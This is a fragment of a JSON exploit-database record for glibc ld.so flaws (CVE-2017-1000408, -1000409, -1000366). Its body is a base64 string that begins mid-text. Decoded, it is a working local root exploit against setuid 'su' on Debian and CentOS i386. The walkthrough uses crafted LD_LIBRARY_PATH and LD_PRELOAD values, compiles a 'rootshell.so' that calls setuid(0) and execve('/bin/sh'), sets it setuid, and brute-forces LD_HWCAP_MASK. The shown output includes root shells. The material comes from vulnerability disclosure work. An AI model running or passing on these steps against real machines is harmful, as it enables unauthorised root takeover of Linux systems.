QuZGlycyIgKCJubGxwIiBpcw0Kb25seSAxLCBiZWNhdXNlIG91ciB1bmV4cGFuZGVkIExEX0xJQlJBUllfUEFUSCBkb2VzIG5vdCBjb250YWluIGNvbG9ucykuDQpJbiBvdGhlciB3b3Jkcywgd2Ugd2lsbCBvdmVyZmxvdyAiZW52X3BhdGhfbGlzdC5kaXJzIiBhbmQgd3JpdGUgNCBieXRlcw0KKHRoZSB0ZXJtaW5hdGluZyBOVUxMIHBvaW50ZXIpIG91dCBvZiBib3VuZHMuDQoNCjMvIFRoaXJkLCB3ZSBvdmVyd3JpdGUgdGhpcyBvdXQtb2YtYm91bmRzIE5VTEwgcG9pbnRlciB3aXRoIHRoZSBmaXJzdA0KYnl0ZXMgb2YgYW4gZXJyb3IgbWVzc2FnZSAoImNhbm5vdCBvcGVuIHNoYXJlZCBvYmplY3QgZmlsZSIpIHRoYXQgaXMNCm1hbGxvYygpYXRlZCBhZnRlciAiZW52X3BhdGhfbGlzdC5kaXJzIiBiZWNhdXNlIG9mIG91ciAibm9uZXhpc3RlbnQiDQpwcmVsb2FkIGxpYnJhcnkuIENvbnNlcXVlbnRseSwgbGQuc28gY3Jhc2hlcyB3aGVuIG9wZW5fcGF0aCgpIHRyaWVzIHRvDQpvcGVuIG91ciBzZWNvbmQgcHJlbG9hZCBsaWJyYXJ5ICJyb290c2hlbGwuc28iIGluIGEgZGlyZWN0b3J5IGRlc2NyaWJlZA0KYnkgYW4gInJfc2VhcmNoX3BhdGhfZWxlbSIgc3RydWN0dXJlIGxvY2F0ZWQgYXQgdGhlIHVubWFwcGVkIGFkZHJlc3MNCjB4NmU2ZTYxNjMgKHRoZSBvdmVyd3JpdHRlbiBOVUxMIHBvaW50ZXIpOg0KDQokIGVudiAtaSBMRF9MSUJSQVJZX1BBVEg9JyRPUklHSU4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vJExJQicgTERfUFJFTE9BRD0nbm9uZXhpc3RlbnQ6cm9vdHNoZWxsLnNvJyAuL3N1DQpFUlJPUjogbGQuc286IG9iamVjdCAnbm9uZXhpc3RlbnQnIGZyb20gTERfUFJFTE9BRCBjYW5ub3QgYmUgcHJlbG9hZGVkIChjYW5ub3Qgb3BlbiBzaGFyZWQgb2JqZWN0IGZpbGUpOiBpZ25vcmVkLg0KU2VnbWVudGF0aW9uIGZhdWx0DQoNCiQgZG1lc2cgfCB0YWlsIC1uIDENCls3MDYzMi44ODg2OTVdIHN1WzIyOTNdOiBzZWdmYXVsdCBhdCA2ZTZlNjE3MyBpcCBiNzdlMWM0MyBzcCBiZmM5NDZkYyBlcnJvciA0IGluIGxkLTIuMjQuc29bYjc3ZGIwMDArMjIwMDBdDQoNClRoZSAiLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLyRMSUIiIHN1ZmZpeCBpcyByZXF1aXJlZCwgdG8gcGFzcyB0aGUNCiJjaGVja19mb3JfdHJ1c3RlZCIgdGVzdCBpbiBfZGxfZHN0X3N1YnN0aXR1dGUoKSAob3VyIGV4cGFuZGVkDQpMRF9MSUJSQVJZX1BBVEggbXVzdCBiZSByb290ZWQgaW4gb25lIG9mIHRoZSBzeXN0ZW0ncyB0cnVzdGVkDQpkaXJlY3RvcmllcykuDQoNCjQvIE5leHQsIHdlIGNvcHkgdGhlIGxpYnJhcnkgZGVwZW5kZW5jaWVzIG9mICJzdSIgdG8gb3VyIGN1cnJlbnQgd29ya2luZw0KZGlyZWN0b3J5LCBhbmQgY29tcGlsZSBvdXIgcHJlbG9hZCBsaWJyYXJ5ICJyb290c2hlbGwuc28iICgibGEuYyIgY2FuIGJlDQpmb3VuZCBhdCB0aGUgYmVnaW5uaW5nIG9mIG91ciBzdGFjay1jbGFzaCBleHBsb2l0ICJMaW51eF9sZHNvX2h3Y2FwLmMiKToNCg0KJCBjcCAtLSBgbGRkIC4vc3UgfCBncmVwICcgPT4gLycgfCBhd2sgJ3twcmludCAkM30nYCAuDQoNCiQgY2F0ID4gbGEuYyA8PCAiRU9GIg0KPiBzdGF0aWMgdm9pZCBfX2F0dHJpYnV0ZV9fICgoY29uc3RydWN0b3IpKSBfaW5pdCAodm9pZCkgew0KPiAgICAgLi4uDQo+ICAgICAvLyBzZXR1aWQoMCk7DQo+ICAgICAuLi4NCj4gICAgIC8vIGV4ZWN2ZSgiL2Jpbi9zaCIpOw0KPiAgICAgLi4uDQo+IH0NCj4gRU9GDQokIGdjYyAtZnBpYyAtc2hhcmVkIC1ub3N0ZGxpYiAtT3MgLXMgLW8gcm9vdHNoZWxsLnNvIGxhLmMNCg0KJCBjaG1vZCB1K3Mgcm9vdHNoZWxsLnNvDQoNClRoaXMgImNobW9kIiBpcyByZXF1aXJlZCwgdG8gcGFzcyB0aGUgU1VJRC1iaXQgdGVzdCBpbiBvcGVuX3BhdGgoKS4NCg0KNS8gTGFzdCwgd2UgcnVuICJzdSIgd2l0aCBhbiBpbmNyZWFzaW5nIG51bWJlciBvZiBoYXJkd2FyZSBjYXBhYmlsaXRpZXMNCihpLmUuLCB3aXRoIGFuIGluY3JlYXNpbmdseSBsYXJnZSAicnRsZF9zZWFyY2hfZGlycy5kaXJzWzBdIiksIHVudGlsIHRoZQ0KInJ0bGRfc2VhcmNoX2RpcnMuZGlyc1swXSIgb2NjdXBpZXMgdGhlIGFkZHJlc3MgMHg2ZTZlNjE2My4gQmVjYXVzZSB0aGlzDQoicnRsZF9zZWFyY2hfZGlycy5kaXJzWzBdIiBpcyBtb3N0bHkgZmlsbGVkIHdpdGggbnVsbCBieXRlcywgYW5kIGJlY2F1c2UNCmFuICJyX3NlYXJjaF9wYXRoX2VsZW0iIHN0cnVjdHVyZSBmaWxsZWQgd2l0aCBudWxsIGJ5dGVzIGlzIGVxdWl2YWxlbnQNCnRvIHRoZSBjdXJyZW50IHdvcmtpbmcgZGlyZWN0b3J5IGluIG9wZW5fcGF0aCgpLCBsZC5zbyB3aWxsIGV2ZW50dWFsbHkNCmxvYWQgYW5kIGV4ZWN1dGUgb3VyICJyb290c2hlbGwuc28iIGZyb20gdGhlIGN1cnJlbnQgd29ya2luZyBkaXJlY3Rvcnk6DQoNCiQgdGltZSBlbnYgLWkgTERfTElCUkFSWV9QQVRIPSckT1JJR0lOLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLyRMSUInIExEX1BSRUxPQUQ9J25vbmV4aXN0ZW50OnJvb3RzaGVsbC5zbycgTERfSFdDQVBfTUFTSz0iJCgoKDE8PDE2KS0xKSkiIC4vc3UNCkVSUk9SOiBsZC5zbzogb2JqZWN0ICdub25leGlzdGVudCcgZnJvbSBMRF9QUkVMT0FEIGNhbm5vdCBiZSBwcmVsb2FkZWQgKGNhbm5vdCBvcGVuIHNoYXJlZCBvYmplY3QgZmlsZSk6IGlnbm9yZWQuDQpTZWdtZW50YXRpb24gZmF1bHQNCg0KcmVhbCAgICAwbTAuNzE1cw0KdXNlciAgICAwbTAuMTIwcw0Kc3lzICAgICAwbTAuNTg4cw0KDQokIHRpbWUgZW52IC1pIExEX0xJQlJBUllfUEFUSD0nJE9SSUdJTi8uLi8uLi8uLi8uLi8uLi8uLi8uLi8uLi8kTElCJyBMRF9QUkVMT0FEPSdub25leGlzdGVudDpyb290c2hlbGwuc28nIExEX0hXQ0FQX01BU0s9IiQoKCgxPDwxNyktMSkpIiAuL3N1DQpFUlJPUjogbGQuc286IG9iamVjdCAnbm9uZXhpc3RlbnQnIGZyb20gTERfUFJFTE9BRCBjYW5ub3QgYmUgcHJlbG9hZGVkIChjYW5ub3Qgb3BlbiBzaGFyZWQgb2JqZWN0IGZpbGUpOiBpZ25vcmVkLg0KU2VnbWVudGF0aW9uIGZhdWx0DQoNCnJlYWwgICAgMG0xLjQ0M3MNCnVzZXIgICAgMG0wLjM2OHMNCnN5cyAgICAgMG0xLjA3MnMNCg0KJCB0aW1lIGVudiAtaSBMRF9MSUJSQVJZX1BBVEg9JyRPUklHSU4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vJExJQicgTERfUFJFTE9BRD0nbm9uZXhpc3RlbnQ6cm9vdHNoZWxsLnNvJyBMRF9IV0NBUF9NQVNLPSIkKCgoMTw8MTgpLTEpKSIgLi9zdQ0KRVJST1I6IGxkLnNvOiBvYmplY3QgJ25vbmV4aXN0ZW50JyBmcm9tIExEX1BSRUxPQUQgY2Fubm90IGJlIHByZWxvYWRlZCAoY2Fubm90IG9wZW4gc2hhcmVkIG9iamVjdCBmaWxlKTogaWdub3JlZC4NClNlZ21lbnRhdGlvbiBmYXVsdA0KDQpyZWFsICAgIDBtMi44NDBzDQp1c2VyICAgIDBtMC42NTZzDQpzeXMgICAgIDBtMi4xNzJzDQoNCi4uLg0KDQokIHRpbWUgZW52IC1pIExEX0xJQlJBUllfUEFUSD0nJE9SSUdJTi8uLi8uLi8uLi8uLi8uLi8uLi8uLi8uLi8kTElCJyBMRF9QUkVMT0FEPSdub25leGlzdGVudDpyb290c2hlbGwuc28nIExEX0hXQ0FQX01BU0s9IiQoKCgxPDwyMyktMSkpIiAuL3N1DQpFUlJPUjogbGQuc286IG9iamVjdCAnbm9uZXhpc3RlbnQnIGZyb20gTERfUFJFTE9BRCBjYW5ub3QgYmUgcHJlbG9hZGVkIChjYW5ub3Qgb3BlbiBzaGFyZWQgb2JqZWN0IGZpbGUpOiBpZ25vcmVkLg0KU2VnbWVudGF0aW9uIGZhdWx0DQoNCnJlYWwgICAgMG01Ljc3OHMNCnVzZXIgICAgMG0xLjIwMHMNCnN5cyAgICAgMG00LjU3NnMNCg0KJCB0aW1lIGVudiAtaSBMRF9MSUJSQVJZX1BBVEg9JyRPUklHSU4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vJExJQicgTERfUFJFTE9BRD0nbm9uZXhpc3RlbnQ6cm9vdHNoZWxsLnNvJyBMRF9IV0NBUF9NQVNLPSIkKCgoMTw8MjQpLTEpKSIgLi9zdQ0KRVJST1I6IGxkLnNvOiBvYmplY3QgJ25vbmV4aXN0ZW50JyBmcm9tIExEX1BSRUxPQUQgY2Fubm90IGJlIHByZWxvYWRlZCAoY2Fubm90IG9wZW4gc2hhcmVkIG9iamVjdCBmaWxlKTogaWdub3JlZC4NClNlZ21lbnRhdGlvbiBmYXVsdA0KDQpyZWFsICAgIDBtMTEuNTg5cw0KdXNlciAgICAwbTIuNTIwcw0Kc3lzICAgICAwbTkuMDYwcw0KDQokIHRpbWUgZW52IC1pIExEX0xJQlJBUllfUEFUSD0nJE9SSUdJTi8uLi8uLi8uLi8uLi8uLi8uLi8uLi8uLi8kTElCJyBMRF9QUkVMT0FEPSdub25leGlzdGVudDpyb290c2hlbGwuc28nIExEX0hXQ0FQX01BU0s9IiQoKCgxPDwyNSktMSkpIiAuL3N1DQpFUlJPUjogbGQuc286IG9iamVjdCAnbm9uZXhpc3RlbnQnIGZyb20gTERfUFJFTE9BRCBjYW5ub3QgYmUgcHJlbG9hZGVkIChjYW5ub3Qgb3BlbiBzaGFyZWQgb2JqZWN0IGZpbGUpOiBpZ25vcmVkLg0KIyBpZDsgZXhpdA0KdWlkPTAocm9vdCkgZ2lkPTAocm9vdCkgZ3JvdXBzPTAocm9vdCksMjQoY2Ryb20pLDI1KGZsb3BweSksMjkoYXVkaW8pLDMwKGRpcCksNDQodmlkZW8pLDQ2KHBsdWdkZXYpLDEwOChuZXRkZXYpLDEwMDAodXNlcikNCg0KcmVhbCAgICAwbTI4LjA1MHMNCnVzZXIgICAgMG02LjE0MHMNCnN5cyAgICAgMG0yMS44OTJzDQoNCjYvIEltcHJvdmVtZW50cyBpbiB0aGUgcnVubmluZyB0aW1lIG9mIHRoaXMgZXhwbG9pdCBhcmUgbGVmdCBhcyBhbg0KZXhlcmNpc2UgZm9yIHRoZSBpbnRlcmVzdGVkIHJlYWRlcjoNCg0KJCBlbnYgLWkgTERfTElCUkFSWV9QQVRIPS4gTERfUFJFTE9BRD1ub25leGlzdGVudCBMRF9IV0NBUF9NQVNLPSIkKCgoMTw8MjUpLTEpKSIgTERfREVCVUc9bGlicyBlbnYgMj4mMSB8IGhlYWQgLWMgMTAwMA0KICAgICAgMzA4NDogICAgIGZpbmQgbGlicmFyeT1ub25leGlzdGVudCBbMF07IHNlYXJjaGluZw0KICAgICAgMzA4NDogICAgICBzZWFyY2ggcGF0aD0uL3Rscy9pNjg2L2Z4c3IvbW14L2NsZmx1c2gvcHNlMzYvcGF0L2Ntb3YvbWNhL3BnZS9tdHJyL3NlcC9hcGljL2N4OC9tY2UvcGFlL21zci90c2MvcHNlL2RlL3ZtZS9mcHU6Li90bHMvaTY4Ni9meHNyL21teC9jbGZsdXNoL3BzZTM2L3BhdC9jbW92L21jYS9wZ2UvbXRyci9zZXAvYXBpYy9jeDgvbWNlL3BhZS9tc3IvdHNjL3BzZS9kZS92bWU6Li90bHMvaTY4Ni9meHNyL21teC9jbGZsdXNoL3BzZTM2L3BhdC9jbW92L21jYS9wZ2UvbXRyci9zZXAvYXBpYy9jeDgvbWNlL3BhZS9tc3IvdHNjL3BzZS9kZS9mcHU6Li90bHMvaTY4Ni9meHNyL21teC9jbGZsdXNoL3BzZTM2L3BhdC9jbW92L21jYS9wZ2UvbXRyci9zZXAvYXBpYy9jeDgvbWNlL3BhZS9tc3IvdHNjL3BzZS9kZTouL3Rscy9pNjg2L2Z4c3IvbW14L2NsZmx1c2gvcHNlMzYvcGF0L2Ntb3YvbWNhL3BnZS9tdHJyL3NlcC9hcGljL2N4OC9tY2UvcGFlL21zci90c2MvcHNlL3ZtZS9mcHU6Li90bHMvaTY4Ni9meHNyL21teC9jbGZsdXNoL3BzZTM2L3BhdC9jbW92L21jYS9wZ2UvbXRyci9zZXAvYXBpYy9jeDgvbWNlL3BhZS9tc3IvdHNjL3BzZS92bWU6Li90bHMvaTY4Ni9meHNyL21teC9jbGZsdXNoL3BzZTM2L3BhdC9jbW92L21jYS9wZ2UvbXRyci9zZXAvYXBpYy9jeDgvbWNlL3BhZS9tc3IvdHNjL3BzZS9mcHU6Li90bHMvaTY4Ni9meHNyL21teC9jbGZsdXNoL3BzZTM2L3BhdC9jbW92L21jYS9wZ2UvbXRyci9zZXAvYXBpYy9jeDgvbWNlL3BhZS9tc3IvdHNjL3BzZTouL3Rscy9pNjg2L2Z4c3IvbW14L2NsZmx1c2gvcHNlMzYvcGF0L2Ntb3YvbWNhL3BnZS9tdHJyL3NlcC9hcGljL2N4OC9tY2UvcGFlL21zci90c2MvZGUvdm1lL2ZwdTouL3Rscy9pNjg2L2Z4c3IvbW14L2NsZmx1c2gvcHNlMzYvcGF0L2Ntb3YvbWNhL3BnZS9tdHJyL3NlcC9hcGljL2N4OC9tYw0KDQokIG1rZGlyIC1wICcuL3Rscy9pNjg2L2Z4c3IvbW14L2NsZmx1c2gvcHNlMzYvcGF0L2Ntb3YvbWNhL3BnZS9tdHJyL3NlcC9hcGljL2N4OC9tY2UvcGFlL21zci90c2MvcHNlL2RlL3ZtZS9mcHUnDQoNCiQgbXYgLS0gKi5zbyogJy4vdGxzL2k2ODYvZnhzci9tbXgvY2xmbHVzaC9wc2UzNi9wYXQvY21vdi9tY2EvcGdlL210cnIvc2VwL2FwaWMvY3g4L21jZS9wYWUvbXNyL3RzYy9wc2UvZGUvdm1lL2ZwdScNCg0KJCB0aW1lIGVudiAtaSBMRF9MSUJSQVJZX1BBVEg9JyRPUklHSU4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vJExJQicgTERfUFJFTE9BRD0nbm9uZXhpc3RlbnQ6cm9vdHNoZWxsLnNvJyBMRF9IV0NBUF9NQVNLPSIkKCgoMTw8MjUpLTEpKSIgLi9zdQ0KRVJST1I6IGxkLnNvOiBvYmplY3QgJ25vbmV4aXN0ZW50JyBmcm9tIExEX1BSRUxPQUQgY2Fubm90IGJlIHByZWxvYWRlZCAoY2Fubm90IG9wZW4gc2hhcmVkIG9iamVjdCBmaWxlKTogaWdub3JlZC4NCiMgaWQ7IGV4aXQNCnVpZD0wKHJvb3QpIGdpZD0wKHJvb3QpIGdyb3Vwcz0wKHJvb3QpLDI0KGNkcm9tKSwyNShmbG9wcHkpLDI5KGF1ZGlvKSwzMChkaXApLDQ0KHZpZGVvKSw0NihwbHVnZGV2KSwxMDgobmV0ZGV2KSwxMDAwKHVzZXIpDQoNCnJlYWwgICAgMG0yMy40ODVzDQp1c2VyICAgIDBtNS4yNDRzDQpzeXMgICAgIDBtMTguMjIwcw0KDQokIHRpbWUgZW52IC1pIExEX0xJQlJBUllfUEFUSD0nJE9SSUdJTi8uLi8uLi8uLi8uLi8uLi8uLi8uLi8uLi8kTElCJyBMRF9QUkVMT0FEPSdvcy1yZWxlYXNlOnJvb3RzaGVsbC5zbycgTERfSFdDQVBfTUFTSz0iJCgoKDE8PDI1KS0xKSkiIC4vc3UNCkVSUk9SOiBsZC5zbzogb2JqZWN0ICdvcy1yZWxlYXNlJyBmcm9tIExEX1BSRUxPQUQgY2Fubm90IGJlIHByZWxvYWRlZCAoaW52YWxpZCBFTEYgaGVhZGVyKTogaWdub3JlZC4NCiMgaWQ7IGV4aXQNCnVpZD0wKHJvb3QpIGdpZD0wKHJvb3QpIGdyb3Vwcz0wKHJvb3QpLDI0KGNkcm9tKSwyNShmbG9wcHkpLDI5KGF1ZGlvKSwzMChkaXApLDQ0KHZpZGVvKSw0NihwbHVnZGV2KSwxMDgobmV0ZGV2KSwxMDAwKHVzZXIpDQoNCnJlYWwgICAgMG0xMS4zNTJzDQp1c2VyICAgIDBtMi44NDRzDQpzeXMgICAgIDBtOC4zODhzDQoNCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KQ2VudE9TIDcgKGkzODYpDQotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCg0KSW4gdGhpcyBleGFtcGxlLCB3ZSBleHBsb2l0ICJzdSIgb24gYSAzMi1iaXQgQ2VudE9TIDcuMy4xNjExOiB3ZQ0KaW5zdGFsbGVkICJDZW50T1MtNy1pMzg2LU1pbmltYWwtMTYxMS5pc28iICh0aGUgbGFzdCByZWxlYXNlIGJlZm9yZQ0KQ1ZFLTIwMTctMTAwMDM2NiB3YXMgcGF0Y2hlZCksIGFuZCBtYW51YWxseSBkaXNhYmxlZCBwcm90ZWN0ZWRfaGFyZGxpbmtzDQooImVjaG8gMCA+IC9wcm9jL3N5cy9mcy9wcm90ZWN0ZWRfaGFyZGxpbmtzIikuDQoNCiQgZW52IC1pIExEX1BSRUxPQUQ9bm9uZXhpc3RlbnQgTERfSFdDQVBfTUFTSz0wIExEX0RFQlVHPWxpYnMgZW52IDI+JjEgfCBoZWFkDQogICAgIDE3ODk2OiAgICAgZmluZCBsaWJyYXJ5PW5vbmV4aXN0ZW50IFswXTsgc2VhcmNoaW5nDQogICAgIDE3ODk2OiAgICAgIHNlYXJjaCBjYWNoZT0vZXRjL2xkLnNvLmNhY2hlDQogICAgIDE3ODk2OiAgICAgIHNlYXJjaCBwYXRoPS9saWIvdGxzL2k2ODY6L2xpYi90bHM6L2xpYi9pNjg2Oi9saWI6L3Vzci9saWIvdGxzL2k2ODY6L3Vzci9saWIvdGxzOi91c3IvbGliL2k2ODY6L3Vzci9saWIgICAgICAgICAgICAgICAgKHN5c3RlbSBzZWFyY2ggcGF0aCkNCiAgICAgMTc4OTY6ICAgICAgIHRyeWluZyBmaWxlPS9saWIvdGxzL2k2ODYvbm9uZXhpc3RlbnQNCiAgICAgMTc4OTY6ICAgICAgIHRyeWluZyBmaWxlPS9saWIvdGxzL25vbmV4aXN0ZW50DQogICAgIDE3ODk2OiAgICAgICB0cnlpbmcgZmlsZT0vbGliL2k2ODYvbm9uZXhpc3RlbnQNCiAgICAgMTc4OTY6ICAgICAgIHRyeWluZyBmaWxlPS9saWIvbm9uZXhpc3RlbnQNCiAgICAgMTc4OTY6ICAgICAgIHRyeWluZyBmaWxlPS91c3IvbGliL3Rscy9pNjg2L25vbmV4aXN0ZW50DQogICAgIDE3ODk2OiAgICAgICB0cnlpbmcgZmlsZT0vdXNyL2xpYi90bHMvbm9uZXhpc3RlbnQNCiAgICAgMTc4OTY6ICAgICAgIHRyeWluZyBmaWxlPS91c3IvbGliL2k2ODYvbm9uZXhpc3RlbnQNCg0KJCBta2RpciAtcCAnL3Zhci90bXAvOi9saWI6L3Vzci9saWI6Jw0KDQokIGNkICcvdmFyL3RtcC86L2xpYjovdXNyL2xpYjonDQoNCiQgbG4gYHdoaWNoIHN1YCAuDQoNCiQgZW52IC1pIExEX0xJQlJBUllfUEFUSD0nJE9SSUdJTi8uLi8uLi8uLi8uLi8uLi8uLi8uLi8uLi8kTElCJyBMRF9QUkVMT0FEPSdub25leGlzdGVudDpyb290c2hlbGwuc28nIC4vc3UNCkVSUk9SOiBsZC5zbzogb2JqZWN0ICdub25leGlzdGVudCcgZnJvbSBMRF9QUkVMT0FEIGNhbm5vdCBiZSBwcmVsb2FkZWQ6IGlnbm9yZWQuDQpTZWdtZW50YXRpb24gZmF1bHQNCg0KJCBkbWVzZyB8IHRhaWwgLW4gMQ0KWyA4NDE0LjkxMTAwMF0gc3VbMTgwODhdOiBzZWdmYXVsdCBhdCA2ZTZlNjE3MyBpcCBiNzc2NDVlMiBzcCBiZmUwY2I0MCBlcnJvciA0IGluIGxkLTIuMTcuc29bYjc3NWYwMDArMWYwMDBdDQoNCiQgY3AgLS0gYGxkZCAuL3N1IHwgZ3JlcCAnID0+IC8nIHwgYXdrICd7cHJpbnQgJDN9J2AgLg0KDQokIGNhdCA+IGxhLmMgPDwgIkVPRiINCj4gc3RhdGljIHZvaWQgX19hdHRyaWJ1dGVfXyAoKGNvbnN0cnVjdG9yKSkgX2luaXQgKHZvaWQpIHsNCj4gICAgIC4uLg0KPiAgICAgLy8gc2V0dWlkKDApOw0KPiAgICAgLi4uDQo+ICAgICAvLyBleGVjdmUoIi9iaW4vc2giKTsNCj4gICAgIC4uLg0KPiB9DQo+IEVPRg0KJCBnY2MgLWZwaWMgLXNoYXJlZCAtbm9zdGRsaWIgLU9zIC1zIC1vIHJvb3RzaGVsbC5zbyBsYS5jDQoNCiQgY2htb2QgdStzIHJvb3RzaGVsbC5zbw0KDQokIHRpbWUgZW52IC1pIExEX0xJQlJBUllfUEFUSD0nJE9SSUdJTi8uLi8uLi8uLi8uLi8uLi8uLi8uLi8uLi8kTElCJyBMRF9QUkVMT0FEPSdub25leGlzdGVudDpyb290c2hlbGwuc28nIExEX0hXQ0FQX01BU0s9IiQoKCgxPDwxNiktMSkpIiAuL3N1DQpFUlJPUjogbGQuc286IG9iamVjdCAnbm9uZXhpc3RlbnQnIGZyb20gTERfUFJFTE9BRCBjYW5ub3QgYmUgcHJlbG9hZGVkOiBpZ25vcmVkLg0KU2VnbWVudGF0aW9uIGZhdWx0DQoNCnJlYWwgICAgMG0wLjUyN3MNCnVzZXIgICAgMG0wLjA4NXMNCnN5cyAgICAgMG0wLjQ0MXMNCg0KJCB0aW1lIGVudiAtaSBMRF9MSUJSQVJZX1BBVEg9JyRPUklHSU4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vJExJQicgTERfUFJFTE9BRD0nbm9uZXhpc3RlbnQ6cm9vdHNoZWxsLnNvJyBMRF9IV0NBUF9NQVNLPSIkKCgoMTw8MTcpLTEpKSIgLi9zdQ0KRVJST1I6IGxkLnNvOiBvYmplY3QgJ25vbmV4aXN0ZW50JyBmcm9tIExEX1BSRUxPQUQgY2Fubm90IGJlIHByZWxvYWRlZDogaWdub3JlZC4NClNlZ21lbnRhdGlvbiBmYXVsdA0KDQpyZWFsICAgIDBtMS4wNjBzDQp1c2VyICAgIDBtMC4xODJzDQpzeXMgICAgIDBtMC44NzdzDQoNCiQgdGltZSBlbnYgLWkgTERfTElCUkFSWV9QQVRIPSckT1JJR0lOLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLyRMSUInIExEX1BSRUxPQUQ9J25vbmV4aXN0ZW50OnJvb3RzaGVsbC5zbycgTERfSFdDQVBfTUFTSz0iJCgoKDE8PDE4KS0xKSkiIC4vc3UNCkVSUk9SOiBsZC5zbzogb2JqZWN0ICdub25leGlzdGVudCcgZnJvbSBMRF9QUkVMT0FEIGNhbm5vdCBiZSBwcmVsb2FkZWQ6IGlnbm9yZWQuDQpTZWdtZW50YXRpb24gZmF1bHQNCg0KcmVhbCAgICAwbTIuMDkzcw0KdXNlciAgICAwbTAuMzg0cw0Kc3lzICAgICAwbTEuNzAycw0KDQouLi4NCg0KJCB0aW1lIGVudiAtaSBMRF9MSUJSQVJZX1BBVEg9JyRPUklHSU4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vJExJQicgTERfUFJFTE9BRD0nbm9uZXhpc3RlbnQ6cm9vdHNoZWxsLnNvJyBMRF9IV0NBUF9NQVNLPSIkKCgoMTw8MjUpLTEpKSIgLi9zdQ0KRVJST1I6IGxkLnNvOiBvYmplY3QgJ25vbmV4aXN0ZW50JyBmcm9tIExEX1BSRUxPQUQgY2Fubm90IGJlIHByZWxvYWRlZDogaWdub3JlZC4NClNlZ21lbnRhdGlvbiBmYXVsdA0KDQpyZWFsICAgIDBtMTcuMDcxcw0KdXNlciAgICAwbTIuNTI1cw0Kc3lzICAgICAwbTE0LjUzN3MNCg0KJCB0aW1lIGVudiAtaSBMRF9MSUJSQVJZX1BBVEg9JyRPUklHSU4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vJExJQicgTERfUFJFTE9BRD0nbm9uZXhpc3RlbnQ6cm9vdHNoZWxsLnNvJyBMRF9IV0NBUF9NQVNLPSIkKCgoMTw8MjYpLTEpKSIgLi9zdQ0KRVJST1I6IGxkLnNvOiBvYmplY3QgJ25vbmV4aXN0ZW50JyBmcm9tIExEX1BSRUxPQUQgY2Fubm90IGJlIHByZWxvYWRlZDogaWdub3JlZC4NClNlZ21lbnRhdGlvbiBmYXVsdA0KDQpyZWFsICAgIDBtMzMuOTI2cw0KdXNlciAgICAwbTUuNDY0cw0Kc3lzICAgICAwbTI4LjQyOXMNCg0KJCB0aW1lIGVudiAtaSBMRF9MSUJSQVJZX1BBVEg9JyRPUklHSU4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vJExJQicgTERfUFJFTE9BRD0nbm9uZXhpc3RlbnQ6cm9vdHNoZWxsLnNvJyBMRF9IV0NBUF9NQVNLPSIkKCgoMTw8MjcpLTEpKSIgLi9zdQ0KRVJST1I6IGxkLnNvOiBvYmplY3QgJ25vbmV4aXN0ZW50JyBmcm9tIExEX1BSRUxPQUQgY2Fubm90IGJlIHByZWxvYWRlZDogaWdub3JlZC4NCnNoLTQuMiMgaWQ7IGV4aXQNCnVpZD0wKHJvb3QpIGdpZD0wKHJvb3QpIGdyb3Vwcz0wKHJvb3QpLDEwMDAodXNlcikgY29udGV4dD11bmNvbmZpbmVkX3U6dW5jb25maW5lZF9yOnVuY29uZmluZWRfdDpzMC1zMDpjMC5jMTAyMw0KDQpyZWFsICAgIDFtMzAuNjA0cw0KdXNlciAgICAwbTE2LjE2OXMNCnN5cyAgICAgMW0xNC4zOTVzDQoNCg0KPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09DQpBY2tub3dsZWRnbWVudHMNCj09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQ0KDQpXZSB0aGFuayB0aGUgbWVtYmVycyBvZiB0aGUgbGludXgtZGlzdHJvc0BvcGVud2FsbCBsaXN0Lg==", 
    "id": "43331", 
    "cves": [
        "CVE-2017-1000409", 
        "CVE-2017-1000408", 
        "CVE-2017-1000366"
    ]
}